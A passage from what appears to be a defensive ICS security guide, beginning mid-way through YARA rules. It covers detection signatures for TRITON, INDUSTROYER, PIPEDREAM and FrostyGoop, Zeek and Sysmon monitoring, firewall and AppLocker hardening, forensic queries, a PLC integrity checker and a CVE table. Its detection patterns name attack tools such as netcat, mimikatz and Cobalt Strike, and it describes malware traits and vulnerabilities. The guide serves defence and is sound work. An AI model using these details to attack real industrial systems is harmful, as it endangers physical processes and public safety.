        $tsbase = "TsBase" ascii wide
        $tslow = "TsLow" ascii wide
        $py2exe_marker = "PYTHONSCRIPT" ascii
        $arm_payload = { 00 00 A0 E1 ?? ?? ?? EA }  // ARM NOP sled
    condition:
        uint16(0) == 0x5A4D and  // PE file
        (3 of ($tristation_magic, $inject_str, $imain_str, $trilog_str,
               $tsbase, $tslow)) or
        ($py2exe_marker and 2 of ($inject_str, $imain_str, $trilog_str))
}

rule INDUSTROYER_Modules {
    meta:
        description = "Detects INDUSTROYER/CrashOverride ICS modules"
        author = "ICS Security Team"
        date = "2026-05-08"
        severity = "critical"
        mitre_attack = "T0831, S0604"
    strings:
        $iec104_seq = { 68 ?? 00 00 00 00 }    // IEC 104 STARTDT
        $goose_ether = { 88 B8 }                // GOOSE EtherType
        $opc_clsid = "13486D51-4821-11D2" ascii // OPC DA Server CLSID
        $defragsvc = "defragsvc" ascii wide nocase
        $siprotec_port = { 11 5B }              // Port 4443 big-endian
        $tor_str = "TOR" ascii wide
        $crash_strings1 = "haslo.dat" ascii wide
        $crash_strings2 = "IEC104" ascii wide
    condition:
        uint16(0) == 0x5A4D and
        (3 of them) or ($defragsvc and any of ($iec104_seq, $goose_ether,
                                                $opc_clsid, $siprotec_port))
}

rule PIPEDREAM_Tools {
    meta:
        description = "Detects PIPEDREAM/INCONTROLLER components"
        author = "ICS Security Team"
        date = "2026-05-08"
        severity = "critical"
        mitre_attack = "T0831, T0886"
    strings:
        $codesys_magic = { BB BB }
        $fins_header = { 80 00 02 }               // FINS ICF+RSV+GCT
        $opcua_hello = "OPN" ascii                  // OPC UA OpenSecureChannel
        $evilscholar = "EVILSCHOLAR" ascii nocase   // internal name (if present)
        $codesys_port = "11740" ascii
        $omron_str = "OMRON" ascii wide nocase
        $fins_str = "FINS" ascii wide nocase
        $dusttunnel_mutex = "Global\\DT_" ascii wide
    condition:
        uint16(0) == 0x5A4D and
        (3 of them)
}

rule FrostyGoop_Modbus_Malware {
    meta:
        description = "Detects FrostyGoop/BUSTLEBERM Modbus attack tool"
        author = "ICS Security Team"
        date = "2026-05-08"
        severity = "critical"
        mitre_attack = "T0831"
    strings:
        $modbus_write16 = { 00 00 00 ?? ?? 10 }   // Write Multiple Registers FC
        $enco_str = "ENCO" ascii wide nocase
        $modbus_port = "502" ascii
        $golang_build = "Go build" ascii           // FrostyGoop written in Go
        $heating_str = "heating" ascii wide nocase
        $lviv_str = "lviv" ascii wide nocase
    condition:
        (uint16(0) == 0x5A4D or uint32(0) == 0x464C457F) and  // PE or ELF
        3 of them
}

rule Generic_ICS_Targeting_Malware {
    meta:
        description = "Generic indicators of ICS-targeting malware"
        author = "ICS Security Team"
        date = "2026-05-08"
        severity = "high"
    strings:
        $modbus_fc_write = { 00 00 00 00 ?? 06 }
        $s7_magic = { 03 00 00 ?? 02 F0 80 32 }   // S7comm TPKT+COTP+S7
        $iec104_start = { 68 04 07 00 00 00 }      // STARTDT act
        $codesys_v3 = { BB BB 01 00 }
        $fins_cmd = { 80 00 02 00 }
        $dnp3_start = { 05 64 }                     // DNP3 start bytes
        $plc_strings1 = "PLC" ascii wide
        $plc_strings2 = "SCADA" ascii wide
        $plc_strings3 = "HMI" ascii wide
    condition:
        (uint16(0) == 0x5A4D or uint32(0) == 0x464C457F) and
        2 of ($modbus_fc_write, $s7_magic, $iec104_start, $codesys_v3,
              $fins_cmd, $dnp3_start) and
        1 of ($plc_strings*)
}
```

### 10.4 Zeek scripts for ICS protocol monitoring

Zeek (formerly Bro) provides programmable network analysis. With ICS protocol analyzers loaded, Zeek can log protocol-level events and execute detection logic.

```bash
# Zeek ICS protocol analyzers (install via zkg package manager)
zkg install zeek/icsnpp-modbus
zkg install zeek/icsnpp-dnp3
zkg install zeek/icsnpp-enip
zkg install zeek/icsnpp-s7comm
zkg install zeek/icsnpp-opcua-binary
```

```zeek
# zeek_ics_monitor.zeek — Zeek script for ICS anomaly detection
# Deploy on a Zeek sensor receiving mirrored OT network traffic

@load base/frameworks/notice
@load policy/protocols/modbus

module ICS_Monitor;

export {
    redef enum Notice::Type += {
        Modbus_Write_Unauthorized,
        S7comm_PLC_Stop,
        IEC104_Rapid_Fire,
        New_ICS_Connection,
    };

    # Approved SCADA server IPs (configure per site)
    const approved_modbus_writers: set[addr] = {
        10.10.1.100,   # SCADA Server 1
        10.10.1.101,   # SCADA Server 2
    } &redef;

    const approved_s7_engineers: set[addr] = {
        10.10.2.50,    # Engineering WS 1
    } &redef;
}

event modbus_write_single_register_request(c: connection,
    headers: ModbusHeaders, address: count, value: count)
{
    if (c$id$orig_h !in approved_modbus_writers) {
        NOTICE([
            $note=Modbus_Write_Unauthorized,
            $conn=c,
            $msg=fmt("Modbus write from unauthorized source %s → register %d = %d",
                     c$id$orig_h, address, value),
            $sub=fmt("register=%d value=%d", address, value),
        ]);
    }
}

event modbus_write_multiple_registers_request(c: connection,
    headers: ModbusHeaders, start_address: count, registers: ModbusRegisters)
{
    if (c$id$orig_h !in approved_modbus_writers) {
        NOTICE([
            $note=Modbus_Write_Unauthorized,
            $conn=c,
            $msg=fmt("Modbus multi-write from unauthorized source %s → %d registers at %d",
                     c$id$orig_h, |registers|, start_address),
        ]);
    }
}
```

The Zeek ICSNPP packages decode ICS protocols into structured logs (modbus.log, s7comm.log, dnp3.log) that feed into the SIEM alongside standard Zeek logs (conn.log, dns.log, http.log). The scripting engine enables complex detection logic — correlating multiple protocol events, maintaining state across sessions, and applying site-specific whitelists.

---

## 11. OT workstation hardening

### 11.1 Sysmon configuration for OT engineering workstations

OT engineering workstations run on Windows and interface directly with PLCs. Sysmon telemetry captures process execution, network connections, and file operations that reveal attacker activity.

```xml
<!-- sysmon-ot-engineering.xml — Sysmon configuration optimized for
     OT engineering workstations. Deploy via GPO or local install. -->
<Sysmon schemaversion="4.90">
  <HashAlgorithms>SHA256</HashAlgorithms>
  <EventFiltering>

    <!-- Event ID 1: Process Creation — log all, focus on ICS-relevant -->
    <ProcessCreate onmatch="include">
      <!-- Python on OT workstations (TRITON indicator) -->
      <Image condition="contains">python</Image>
      <Image condition="contains">py2exe</Image>
      <!-- PowerShell (lateral movement, reconnaissance) -->
      <Image condition="contains">powershell</Image>
      <Image condition="contains">pwsh</Image>
      <!-- Command shells -->
      <Image condition="contains">cmd.exe</Image>
      <!-- Remote access tools (Oldsmar vector) -->
      <Image condition="contains">TeamViewer</Image>
      <Image condition="contains">AnyDesk</Image>
      <Image condition="contains">LogMeIn</Image>
      <!-- Scripting engines -->
      <Image condition="contains">wscript</Image>
      <Image condition="contains">cscript</Image>
      <Image condition="contains">mshta</Image>
      <!-- PLC engineering tools — log for audit trail -->
      <Image condition="contains">TIA Portal</Image>
      <Image condition="contains">RSLogix</Image>
      <Image condition="contains">Unity Pro</Image>
      <Image condition="contains">TriStation</Image>
      <Image condition="contains">Codesys</Image>
    </ProcessCreate>

    <!-- Event ID 3: Network Connection — log ICS protocol ports -->
    <NetworkConnect onmatch="include">
      <DestinationPort condition="is">502</DestinationPort>    <!-- Modbus -->
      <DestinationPort condition="is">102</DestinationPort>    <!-- S7comm -->
      <DestinationPort condition="is">2404</DestinationPort>   <!-- IEC 104 -->
      <DestinationPort condition="is">44818</DestinationPort>  <!-- EtherNet/IP -->
      <DestinationPort condition="is">4840</DestinationPort>   <!-- OPC UA -->
      <DestinationPort condition="is">11740</DestinationPort>  <!-- Codesys V3 -->
      <DestinationPort condition="is">9600</DestinationPort>   <!-- FINS -->
      <DestinationPort condition="is">20000</DestinationPort>  <!-- DNP3 -->
      <DestinationPort condition="is">2455</DestinationPort>   <!-- Codesys V2 -->
      <DestinationPort condition="is">4443</DestinationPort>   <!-- SIPROTEC -->
      <!-- TOR ports (INDUSTROYER C2 indicator) -->
      <DestinationPort condition="is">9001</DestinationPort>
      <DestinationPort condition="is">9030</DestinationPort>
      <DestinationPort condition="is">9050</DestinationPort>
    </NetworkConnect>

    <!-- Event ID 11: File Create — detect ICS malware drops -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">.bin</TargetFilename>
      <TargetFilename condition="contains">inject</TargetFilename>
      <TargetFilename condition="contains">imain</TargetFilename>
      <TargetFilename condition="contains">trilog</TargetFilename>
      <TargetFilename condition="contains">.s7p</TargetFilename>
      <TargetFilename condition="contains">.zap</TargetFilename>
      <TargetFilename condition="contains">.acd</TargetFilename>
    </FileCreate>

    <!-- Event ID 22: DNS Query — detect C2 and anomalous lookups -->
    <DnsQuery onmatch="include">
      <QueryName condition="contains">.onion</QueryName>
      <QueryName condition="contains">.tor</QueryName>
    </DnsQuery>

  </EventFiltering>
</Sysmon>
```

### 11.2 Application whitelisting for engineering workstations

Engineering workstations should only execute approved engineering software, the OS, and security tools. Application whitelisting prevents execution of attacker tools (Python interpreters, custom C2 implants, reconnaissance scripts).

```xml
<!-- WDAC (Windows Defender Application Control) policy for OT
     engineering workstations. Compile with ConvertFrom-CIPolicy. -->
<!--
  PowerShell deployment:
    $PolicyPath = "C:\Windows\System32\CodeIntegrity\SIPolicy.p7b"
    ConvertFrom-CIPolicy -XmlFilePath .\OT_WDAC_Policy.xml `
                         -BinaryFilePath $PolicyPath
    Restart-Computer
-->

<!-- AppLocker rules (alternative for environments without WDAC support) -->
<!-- Deploy via GPO: Computer Configuration > Windows Settings >
     Security Settings > Application Control Policies > AppLocker -->
```

```powershell
# PowerShell: Configure AppLocker rules for OT engineering workstation
# Allow only signed executables from approved publishers

# Siemens TIA Portal
New-AppLockerPolicy -RuleType Publisher -User Everyone `
    -Publisher "O=SIEMENS AG,*" -Action Allow

# Rockwell FactoryTalk / RSLogix
New-AppLockerPolicy -RuleType Publisher -User Everyone `
    -Publisher "O=ROCKWELL AUTOMATION*,*" -Action Allow

# Schneider Electric Unity Pro / EcoStruxure
New-AppLockerPolicy -RuleType Publisher -User Everyone `
    -Publisher "O=SCHNEIDER ELECTRIC*,*" -Action Allow

# Windows OS components (required)
New-AppLockerPolicy -RuleType Path -User Everyone `
    -Path "%WINDIR%\*" -Action Allow

# DENY all other executables (default deny)
New-AppLockerPolicy -RuleType Path -User Everyone `
    -Path "*" -Action Deny

# Block Python interpreters explicitly (TRITON attack vector)
New-AppLockerPolicy -RuleType Path -User Everyone `
    -Path "*\python*.exe" -Action Deny
New-AppLockerPolicy -RuleType Path -User Everyone `
    -Path "*\py.exe" -Action Deny
```

### 11.3 Windows GPO settings for OT workstations

Key Group Policy settings that harden OT workstations without breaking engineering tool functionality.

```
Computer Configuration > Windows Settings > Security Settings:

  Account Policies > Password Policy:
    - Minimum password length: 14 characters
    - Password complexity: Enabled
    - Maximum password age: 90 days

  Local Policies > Audit Policy:
    - Audit logon events: Success, Failure
    - Audit object access: Success, Failure
    - Audit process tracking: Success

  Local Policies > User Rights Assignment:
    - Deny access from the network: Guest, Anonymous
    - Deny log on through Remote Desktop: Guest
    - Allow log on locally: OT_Operators, OT_Engineers (restrict)

  Local Policies > Security Options:
    - Network access: Do not allow anonymous enumeration of SAM accounts: Enabled
    - Network access: Restrict anonymous access to Named Pipes and Shares: Enabled
    - Interactive logon: Do not display last user name: Enabled

  Windows Firewall with Advanced Security:
    - Inbound default: Block
    - Outbound default: Block (with explicit allow rules below)

Computer Configuration > Administrative Templates:
  System > Removable Storage Access:
    - All Removable Storage classes: Deny all access: Enabled
      (prevents USB-based malware delivery — Stuxnet vector)

  Windows Components > Windows Remote Management:
    - Allow remote server management through WinRM: Disabled
      (unless required for PAM integration)

  Windows Components > Remote Desktop Services:
    - Allow users to connect remotely: Disabled
      (use PAM jump servers instead of direct RDP)
```

### 11.4 Network microsegmentation rules

Microsegmentation at the host level provides defense-in-depth when the OT network lacks proper VLAN segmentation. These rules restrict which hosts can communicate with which ICS devices.

```bash
# --- nftables rules for Linux-based HMI/historian hosts ---
#!/usr/sbin/nft -f

flush ruleset

table inet ot_firewall {
    set plc_targets {
        type ipv4_addr
        elements = { 192.168.1.10, 192.168.1.11, 192.168.1.12 }
        comment "Authorized PLC targets for this HMI"
    }

    set scada_servers {
        type ipv4_addr
        elements = { 10.10.1.100, 10.10.1.101 }
        comment "SCADA servers allowed to reach this host"
    }

    chain input {
        type filter hook input priority 0; policy drop;

        # Allow established/related
        ct state established,related accept

        # Allow ICMP (for network diagnostics)
        ip protocol icmp accept

        # Allow SSH from management VLAN only
        tcp dport 22 ip saddr 10.10.250.0/24 accept

        # Allow Modbus TCP from SCADA servers only
        tcp dport 502 ip saddr @scada_servers accept

        # Allow historian queries from data collection
        tcp dport 5450 ip saddr @scada_servers accept

        # Log and drop everything else
        log prefix "OT_FW_DROP: " drop
    }

    chain output {
        type filter hook output priority 0; policy drop;

        ct state established,related accept

        # Allow Modbus to authorized PLCs only
        tcp dport 502 ip daddr @plc_targets accept

        # Allow S7comm to authorized PLCs only
        tcp dport 102 ip daddr @plc_targets accept

        # Allow DNS
        udp dport 53 accept
        tcp dport 53 accept

        # Allow NTP
        udp dport 123 accept

        # Allow syslog to SIEM
        udp dport 514 ip daddr 10.10.250.10 accept

        log prefix "OT_FW_OUT_DROP: " drop
    }
}
```

```powershell
# --- Windows Firewall rules for Windows-based HMI workstations ---
# Deploy via GPO or local PowerShell script

# Reset to default-deny
Set-NetFirewallProfile -Profile Domain,Private,Public `
    -DefaultInboundAction Block -DefaultOutboundAction Block

# Allow Modbus TCP outbound to specific PLCs only
New-NetFirewallRule -DisplayName "OT: Modbus to PLC1" `
    -Direction Outbound -Protocol TCP -RemotePort 502 `
    -RemoteAddress 192.168.1.10 -Action Allow

New-NetFirewallRule -DisplayName "OT: Modbus to PLC2" `
    -Direction Outbound -Protocol TCP -RemotePort 502 `
    -RemoteAddress 192.168.1.11 -Action Allow

# Allow S7comm outbound to Siemens PLCs
New-NetFirewallRule -DisplayName "OT: S7comm to S7-1500" `
    -Direction Outbound -Protocol TCP -RemotePort 102 `
    -RemoteAddress 192.168.1.20 -Action Allow

# Allow OPC UA outbound
New-NetFirewallRule -DisplayName "OT: OPC UA to historian" `
    -Direction Outbound -Protocol TCP -RemotePort 4840 `
    -RemoteAddress 10.10.3.100 -Action Allow

# Allow SCADA server inbound connections
New-NetFirewallRule -DisplayName "OT: SCADA inbound" `
    -Direction Inbound -Protocol TCP -LocalPort 502 `
    -RemoteAddress 10.10.1.100,10.10.1.101 -Action Allow

# Block all outbound to internet (no OT host should reach internet)
New-NetFirewallRule -DisplayName "OT: Block Internet" `
    -Direction Outbound -Protocol TCP -RemotePort 80,443 `
    -Action Block

# Block TOR ports explicitly (INDUSTROYER C2)
New-NetFirewallRule -DisplayName "OT: Block TOR" `
    -Direction Outbound -Protocol TCP `
    -RemotePort 9001,9030,9050,9051,9150 -Action Block

# Allow syslog to SIEM
New-NetFirewallRule -DisplayName "OT: Syslog to SIEM" `
    -Direction Outbound -Protocol UDP -RemotePort 514 `
    -RemoteAddress 10.10.250.10 -Action Allow

# Allow DNS and NTP
New-NetFirewallRule -DisplayName "OT: DNS" `
    -Direction Outbound -Protocol UDP -RemotePort 53 `
    -RemoteAddress 10.10.250.1 -Action Allow
New-NetFirewallRule -DisplayName "OT: NTP" `
    -Direction Outbound -Protocol UDP -RemotePort 123 `
    -RemoteAddress 10.10.250.1 -Action Allow
```

The default-deny outbound policy is critical. An OT workstation that can reach the internet can be used for C2 communication (INDUSTROYER used TOR, TRITON used HTTP callbacks). Blocking all outbound except explicitly approved destinations eliminates the majority of C2 channel options.

---

## 12. ICS incident response code

### 12.1 Velociraptor VQL artifacts for OT workstation triage

Velociraptor provides agent-based forensic collection on Windows workstations. These VQL artifacts target ICS-specific indicators.

```yaml
# --- Velociraptor artifact: OT Workstation Triage ---
name: Custom.OT.WorkstationTriage
description: |
    Collect ICS-specific forensic artifacts from OT engineering workstations.
    Targets TRITON indicators, ICS engineering tool artifacts, remote access
    software, and anomalous process execution.

sources:
  - name: ICS_Malware_Indicators
    query: |
        -- Search for TRITON framework components
        SELECT OSPath, Size, Mtime, hash(path=OSPath, hashselect="SHA256") AS SHA256
        FROM glob(globs=[
            "C:\\Users\\**\\trilog.exe",
            "C:\\Users\\**\\inject.bin",
            "C:\\Users\\**\\imain.bin",
            "C:\\Users\\**\\*.bin",
            "C:\\Temp\\**\\python27.dll",
            "C:\\Temp\\**\\library.zip"
        ])

  - name: ICS_Engineering_Tool_Connections
    query: |
        -- Recent connections to ICS protocol ports from Sysmon Event ID 3
        SELECT EventTime, SourceIP, DestinationIP, DestinationPort, Image
        FROM source(artifact="Windows.EventLogs.EvtxHunter",
                    EvtxGlob="C:\\Windows\\System32\\winevt\\Logs\\*Sysmon*",
                    IdRegex="3")
        WHERE DestinationPort IN (502, 102, 2404, 44818, 4840, 11740,
                                   9600, 20000, 2455, 4443)

  - name: Suspicious_Processes
    query: |
        -- Processes that should not run on engineering workstations
        SELECT Pid, Name, Exe, CommandLine, Username, CreateTime
        FROM pslist()
        WHERE Name =~ "(?i)(python|py2exe|tor|teamviewer|anydesk|ncat|nmap|"
                     + "wireshark|tcpdump|netcat|psexec|mimikatz|cobaltstrike)"

  - name: Remote_Access_Software
    query: |
        -- Installed remote access tools (Oldsmar attack vector)
        SELECT Name, InstallDate, InstallLocation, Publisher
        FROM Artifact.Windows.Sys.Programs()
        WHERE Name =~ "(?i)(teamviewer|anydesk|logmein|bomgar|splashtop|"
                     + "connectwise|vnc|remotepc)"

  - name: PLC_Project_Files
    query: |
        -- Recently modified PLC project files (indicator of program tampering)
        SELECT OSPath, Size, Mtime, Atime,
               hash(path=OSPath, hashselect="SHA256") AS SHA256
        FROM glob(globs=[
            "C:\\Users\\**\\*.s7p",    -- Siemens Step 7 projects
            "C:\\Users\\**\\*.zap16",  -- Siemens TIA Portal archives
            "C:\\Users\\**\\*.acd",    -- Rockwell RSLogix projects
            "C:\\Users\\**\\*.stu",    -- Schneider Unity projects
            "C:\\Users\\**\\*.project" -- Codesys projects
        ])
        WHERE Mtime > timestamp(epoch=now() - 30 * 24 * 3600)
```

### 12.2 Wireshark display filters for ICS protocol forensics

Wireshark display filters for isolating ICS protocol traffic during forensic analysis of packet captures from the OT network.

```bash
# --- Modbus TCP ---
modbus                                    # All Modbus TCP traffic
modbus.func_code == 6                     # Write Single Register
modbus.func_code == 16                    # Write Multiple Registers
modbus.func_code == 5                     # Write Single Coil
modbus.func_code == 15                    # Write Multiple Coils
modbus.func_code >= 65 && modbus.func_code <= 72  # User-defined FCs
modbus && !ip.src == 10.10.1.100          # Modbus not from SCADA server

# --- S7comm ---
s7comm                                    # All S7comm traffic
s7comm.param.func == 0x29                 # PLC Stop
s7comm.param.func == 0x28                 # PLC Cold Restart
s7comm.param.func == 0x1a                 # Download Block
s7comm.param.func == 0x1e                 # Upload Block
s7comm.data.returncode == 0x0a            # Access denied errors
s7comm && !ip.src == 10.10.2.50           # S7comm not from engineering WS

# --- IEC 60870-5-104 ---
iec60870_104                              # All IEC 104 traffic
iec60870_104.type == 45                   # C_SC_NA_1 Single Command
iec60870_104.type == 46                   # C_DC_NA_1 Double Command
iec60870_104.type == 48                   # C_SE_NA_1 Normalized Setpoint
iec60870_104.type == 100                  # C_IC_NA_1 Interrogation

# --- DNP3 ---
dnp3                                      # All DNP3 traffic
dnp3.al.func == 3                         # Direct Operate
dnp3.al.func == 4                         # Direct Operate No Ack
dnp3.al.func == 129                       # Response (unsolicited check)

# --- EtherNet/IP / CIP ---
enip                                      # All EtherNet/IP
cip                                       # All CIP traffic
cip.service == 0x4d                       # Forward Open (session start)
cip.service == 0x52                       # Unconnected Send

# --- OPC UA ---
opcua                                     # All OPC UA traffic
opcua.transport.type == "OPN"             # OpenSecureChannel
opcua.servicenodeid == 673               # Write request

# --- GOOSE (IEC 61850) ---
goose                                     # All GOOSE traffic
goose && eth.src != 00:01:02:03:04:05     # GOOSE from unknown MAC

# --- Codesys ---
tcp.port == 11740                         # Codesys V3 programming
tcp.port == 2455                          # Codesys V2 shell

# --- Compound forensic filters ---
# All writes to any ICS protocol from unauthorized sources
(modbus.func_code == 6 || modbus.func_code == 16 ||
 s7comm.param.func == 0x1a ||
 iec60870_104.type >= 45) && !ip.src == 10.10.1.100

# Potential reconnaissance: reads from unknown sources
(modbus.func_code == 3 || s7comm.param.func == 0x1e ||
 iec60870_104.type == 100) && !ip.src == 10.10.1.100
```

### 12.3 PLC program golden image verification with python-snap7

Automated verification of PLC program integrity by comparing the running program against a stored golden image hash.

```python
#!/usr/bin/env python3
"""PLC program golden image verification — downloads all program blocks
from an S7 PLC and compares SHA-256 hashes against stored baselines.
Run periodically (cron) or trigger on engineering tool activity."""

import snap7
import hashlib
import json
import sys
from datetime import datetime, timezone
from pathlib import Path

GOLDEN_IMAGE_PATH = Path("/opt/ics-security/golden-images/")
ALERT_LOG = Path("/var/log/plc-integrity.log")

PLC_INVENTORY = [
    {"name": "PLC-Reactor-01", "ip": "192.168.1.10", "rack": 0, "slot": 1},
    {"name": "PLC-Pump-02",    "ip": "192.168.1.11", "rack": 0, "slot": 1},
    {"name": "SIS-Safety-01",  "ip": "192.168.1.20", "rack": 0, "slot": 1},
]

BLOCK_TYPES = {
    snap7.types.Block_OB: "OB",
    snap7.types.Block_FB: "FB",
    snap7.types.Block_FC: "FC",
    snap7.types.Block_DB: "DB",
}

def load_golden_hashes(plc_name: str) -> dict:
    path = GOLDEN_IMAGE_PATH / f"{plc_name}.json"
    if path.exists():
        return json.loads(path.read_text())
    return {}

def alert(message: str) -> None:
    ts = datetime.now(timezone.utc).isoformat()
    entry = f"[{ts}] ALERT: {message}\n"
    print(entry, end="", file=sys.stderr)
    with ALERT_LOG.open("a") as f:
        f.write(entry)

def verify_plc(plc_info: dict) -> bool:
    name = plc_info["name"]
    golden = load_golden_hashes(name)
    if not golden:
        alert(f"{name}: no golden image found — skipping (create baseline first)")
        return True

    client = snap7.client.Client()
    try:
        client.connect(plc_info["ip"], plc_info["rack"], plc_info["slot"])
    except Exception as e:
        alert(f"{name}: connection failed — {e}")
        return False

    all_match = True
    current_hashes = {}

    for btype, bname in BLOCK_TYPES.items():
        try:
            block_list = client.list_blocks_of_type(btype, 1024)
        except Exception:
            continue

        for bn in block_list:
            block_id = f"{bname}{bn}"
            try:
                data = client.full_upload(btype, bn)
                digest = hashlib.sha256(data).hexdigest()
                current_hashes[block_id] = digest

                if block_id in golden:
                    if digest != golden[block_id]:
                        alert(f"{name}: MISMATCH on {block_id} — "
                              f"expected {golden[block_id][:16]}..., "
                              f"got {digest[:16]}...")
                        all_match = False
                else:
                    alert(f"{name}: NEW BLOCK {block_id} not in golden image "
                          f"(SHA-256={digest[:16]}...)")
                    all_match = False
            except Exception as e:
                alert(f"{name}: failed to upload {block_id} — {e}")

    # Check for deleted blocks
    for block_id in golden:
        if block_id not in current_hashes:
            alert(f"{name}: MISSING BLOCK {block_id} — present in golden image "
                  f"but not on PLC")
            all_match = False

    client.disconnect()

    if all_match:
        ts = datetime.now(timezone.utc).isoformat()
        print(f"[{ts}] {name}: all blocks match golden image")

    return all_match

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--baseline", action="store_true",
                        help="Create golden image baseline (first run)")
    args = parser.parse_args()

    if args.baseline:
        for plc in PLC_INVENTORY:
            name = plc["name"]
            client = snap7.client.Client()
            client.connect(plc["ip"], plc["rack"], plc["slot"])
            hashes = {}
            for btype, bname in BLOCK_TYPES.items():
                try:
                    for bn in client.list_blocks_of_type(btype, 1024):
                        data = client.full_upload(btype, bn)
                        hashes[f"{bname}{bn}"] = hashlib.sha256(data).hexdigest()
                except Exception:
                    pass
            client.disconnect()
            out = GOLDEN_IMAGE_PATH / f"{name}.json"
            out.parent.mkdir(parents=True, exist_ok=True)
            out.write_text(json.dumps(hashes, indent=2))
            print(f"Baseline created: {out} ({len(hashes)} blocks)")
    else:
        failures = []
        for plc in PLC_INVENTORY:
            if not verify_plc(plc):
                failures.append(plc["name"])
        if failures:
            sys.exit(f"INTEGRITY CHECK FAILED for: {', '.join(failures)}")
```

Run with `--baseline` on initial deployment after verifying the PLC programs are correct. Schedule periodic verification (every 5 minutes for critical PLCs, every 15 minutes for non-critical) via cron or systemd timer. The alert log integrates with syslog forwarding to the SIEM.

### 12.4 Timeline reconstruction queries against historian data

SQL queries for extracting forensic timelines from process historians. OSIsoft PI uses the PI SQL Data Access Server; AVEVA Historian uses a SQL Server backend.

```sql
-- OSIsoft PI SQL DAS — extract process variable timeline during incident

-- Step 1: Identify anomalous setpoint changes
SELECT
    tag,
    time AS event_time_utc,
    value AS setpoint_value,
    status,
    LAG(value) OVER (PARTITION BY tag ORDER BY time) AS previous_value,
    ABS(value - LAG(value) OVER (PARTITION BY tag ORDER BY time)) AS delta
FROM piarchive..picomp2
WHERE tag IN (
    'REACTOR_01.TEMP_SP',
    'REACTOR_01.PRESSURE_SP',
    'PUMP_01.SPEED_SP',
    'SAFETY_INTERLOCK.ENABLE'
)
AND time BETWEEN '2026-01-15 22:00:00' AND '2026-01-16 06:00:00'
ORDER BY time;

-- Step 2: Detect rapid value changes (automated attack indicator)
SELECT
    tag,
    time AS event_time_utc,
    value,
    DATEDIFF(ms,
        LAG(time) OVER (PARTITION BY tag ORDER BY time),
        time) AS ms_since_last_change
FROM piarchive..picomp2
WHERE tag LIKE 'BREAKER_%'
AND time BETWEEN '2026-01-15 23:50:00' AND '2026-01-16 00:10:00'
AND DATEDIFF(ms,
    LAG(time) OVER (PARTITION BY tag ORDER BY time),
    time) < 1000  -- changes faster than 1 second apart (INDUSTROYER pattern)
ORDER BY time;

-- Step 3: Correlate process excursions with operator actions
SELECT
    h.tag,
    h.time AS process_time,
    h.value AS process_value,
    a.time AS action_time,
    a.userid AS operator,
    a.action_description
FROM piarchive..picomp2 h
LEFT JOIN [ScadaAudit].[dbo].[OperatorActions] a
    ON ABS(DATEDIFF(second, h.time, a.time)) < 5
WHERE h.tag = 'REACTOR_01.TEMP_PV'
AND h.value > 200  -- exceeded safe temperature limit
AND h.time BETWEEN '2026-01-15 22:00:00' AND '2026-01-16 06:00:00'
ORDER BY h.time;

-- AVEVA Historian (SQL Server backend) — equivalent queries
SELECT
    TagName,
    DateTime AS event_time_utc,
    Value,
    QualityDetail
FROM Runtime.dbo.History
WHERE TagName IN ('Reactor01_TempSP', 'Reactor01_PressureSP')
AND DateTime BETWEEN '2026-01-15 22:00:00' AND '2026-01-16 06:00:00'
AND wwRetrievalMode = 'Delta'
ORDER BY DateTime;
```

The delta query (Step 2) identifies the machine-speed command sequences characteristic of automated ICS malware. INDUSTROYER sent dozens of IEC 104 open commands per second; human operators cannot issue commands faster than approximately one per two seconds. Rapid-fire value changes in historian data that correlate with network capture timestamps provide the forensic link between cyber commands and physical process effects.

---

## 13. ICS CVE reference table

The table below maps major ICS CVEs to affected products, attack types, severity, and detection methods. CVEs are grouped by vendor/platform.

| CVE | Product | Attack Type | CVSS | Detection Method |
|---|---|---|---|---|
| **Schneider Electric** | | | | |
| CVE-2018-7522 | Triconex SIS (Tricon v10.0-10.4) | Improper input validation in TriStation protocol handler — TRITON payload injection | 7.5 High | TriStation protocol monitoring; SIS program integrity check |
| CVE-2019-6806 | Modicon M340/M580 | Information disclosure via UMAS protocol | 7.5 High | UMAS protocol monitoring; Suricata ICS signatures |
| CVE-2021-22779 | Modicon M340/M580 | Authentication bypass via UMAS | 9.8 Critical | Monitor for UMAS sessions from unauthorized sources |
| **Siemens** | | | | |
| CVE-2019-13945 | S7-1200 (v4.x) | Unauthenticated PLC Stop via S7comm | 7.5 High | Suricata rule for S7comm function code 0x29 |
| CVE-2022-38465 | S7-1200/S7-1500 | Hardcoded global private key in CPU firmware — TLS session key extraction | 9.8 Critical | Firmware update verification; network TLS inspection |
| CVE-2019-13920 | SIMATIC WinCC | XSS in HMI web interface | 6.1 Medium | WAF rules; HMI web access logging |
| CVE-2015-5374 | SIPROTEC 4 relays | DoS via crafted packet to port 4443 — relay becomes unresponsive (INDUSTROYER) | 7.5 High | Suricata rule for port 4443 traffic to SIPROTEC |
| **Codesys (500+ vendors)** | | | | |
| CVE-2021-29240 to -29247 | Codesys V3 runtime | Heap/stack buffer overflows in CmpApp/CmpTraceMgr — unauthenticated RCE | 9.8 Critical | Monitor TCP 11740 connections; patch Codesys runtime |
| CVE-2022-31806 | Codesys V3 runtime | Authentication disabled by default on programming interface | 9.8 Critical | Sigma rule for non-engineering Codesys connections |
| CVE-2022-4048 | Codesys V3 runtime | Weak encryption in download code — PLC program decryption | 7.7 High | PLC program integrity monitoring |
| **Rockwell Automation** | | | | |
| CVE-2023-3595 | 1756 ControlLogix/GuardLogix | Unauthenticated RCE via crafted CIP packet — firmware manipulation | 9.8 Critical | CIP protocol inspection; firmware integrity monitoring |
| CVE-2023-3596 | 1756-EN4TR | DoS via crafted CIP packet — communication module crash | 7.5 High | Monitor for EtherNet/IP anomalies to EN4TR modules |
| CVE-2022-1159 | Studio 5000 Logix Designer | Project file manipulation — compiled code differs from source view (Stuxnet-like) | 7.7 High | PLC program hash comparison against golden image |
| **INDUSTROYER/INDUSTROYER2** | | | | |
| (CVE-2015-5374 above) | SIPROTEC 4 — relay DoS | Used by INDUSTROYER wiper module | 7.5 High | Port 4443 monitoring |
| (no dedicated CVE) | IEC 104 protocol abuse | Automated breaker opening via legitimate protocol commands | N/A | IEC 104 behavioral monitoring; command rate analysis |
| **PIPEDREAM** | | | | |
| (CVE-2021-29240 series above) | Codesys V3 — EVILSCHOLAR component | Unauthenticated program upload | 9.8 Critical | Codesys connection monitoring |
| (no dedicated CVE) | Omron FINS — BADOMEN component | Unauthenticated memory read/write via FINS | N/A | FINS traffic from non-engineering sources |
